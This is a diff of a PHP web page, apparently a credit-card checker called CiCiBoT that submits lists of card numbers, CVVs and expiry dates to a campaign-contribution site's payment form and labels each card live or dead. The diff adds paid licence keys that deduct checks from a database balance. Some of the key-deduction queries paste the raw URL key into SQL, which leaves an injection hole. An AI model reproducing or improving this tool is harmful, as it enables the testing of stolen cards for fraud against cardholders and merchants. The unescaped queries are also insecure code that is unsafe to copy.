@@ -1,11 +1,31 @@
 <?php
 session_start();
+require('DB.php');
+if(!isset($_GET['key'])){
+    header("Location: key.php");
+    return;
+}
+else{
+    $db = connect();
+    $sql = "SELECT * FROM `mykeys` WHERE keys='" . mysql_real_escape_string($_GET['key']) . "' ";
+    $key = null;
+    foreach ($db->query($sql) as $row) {
+        $key = $row;
+    }
+    if($key==null){
+        header("Location: key.php?error=1");
+        return;
+    }
+    if($key['leftamount']<=0){
+        header("Location: key.php?error=2");
+        return;
+    }
+}
 ?>
 <html>
 <head>
     <title>Check CC from campaigncontribution.com</title>
     <link rel="stylesheet" type="text/css" href="default1.css">
-
 </head>
 <body>
 <center>
@@ -295,6 +315,11 @@ $cclist = explode("\n", $cclist);
 if (isset($_POST['dup'])) $cclist = _dup($cclist);
 $relog = 0;
 $tongso = count($cclist);
+echo  $key['leftamount'];
+if($tongso > $key['leftamount']){
+    header("Location: key.php?error=3");
+    return;
+}
 foreach ($cclist as $ccline) {
     $relog++;
     $ccnum = info($ccline);
@@ -302,13 +327,23 @@ foreach ($cclist as $ccline) {
         if (_bin($ccnum)) {
             $post = "ACTION=&credit_card=" . $ccnum['type'] . "&card_number=" . $ccnum['num'] . "&card_cvv_number=" . $ccnum['cvv'] . "&MONTH=" . ($ccnum['mon']) . "&YEAR=" . ($ccnum['year']);
             $balance = $_POST['balance'];
+
             $okokok = check($ccnum['num'], $ccnum['cvv'], $ccnum['mon'], $ccnum['year'],21212,$balance);
             //echo $post.'<br>';
 
+            $keytype = $key['keytype'];
+            if($keytype==1){
+                    $sql = "UPDATE  `mykeys` SET leftamount=leftamount-1 WHERE keys='".$_GET['key']."' ";
+                    $count = $db->exec($sql);
+            }
 
             if ($okokok == 1) {
                 echo $relog . "/" . $tongso . ".<font color=green>Live | " . $ccline . "</font><br>";
                 $cc['l'][] = $ccline;
+                if($keytype==0){
+                    $sql = "UPDATE  `mykeys` SET leftamount=leftamount-1 WHERE keys='".$_GET['key']."' ";
+                    $count = $db->exec($sql);
+                }
             }
             if ($okokok == 2) {
                 echo $relog . "/" . $tongso . ".<font color=red>Die | " . $ccline . "</font><br>";
@@ -418,8 +453,18 @@ echo "<center><font color=green><strong>LIVE: " . count($cc['l']) . " ~ $xx %</s
 }else {
 ?>
 <html>
+<head>
+    <meta charset="utf-8">
+</head>
+<body>
 <center><h1>CiCiBoT</h1>
-
+    <p>
+        <?php
+         if(isset($key) && $key !=null){
+             echo 'Using KEY: <b>'.$key['keys'].'</b>, còn '.$key['leftamount'].' lần check';
+         }
+        ?>
+    </p>
     <form action="" method=post>
         <textarea wrap="off" name=cclist style="width:90%;height:50%"></textarea><br>
         Duplicate Remove: <input name=dup type=checkbox value=1 checked> Sort by type: <input
@@ -432,4 +477,5 @@ echo "<center><font color=green><strong>LIVE: " . count($cc['l']) . " ~ $xx %</s
     <br>
     <? } ?>
 </center>
+</body>
 </html>
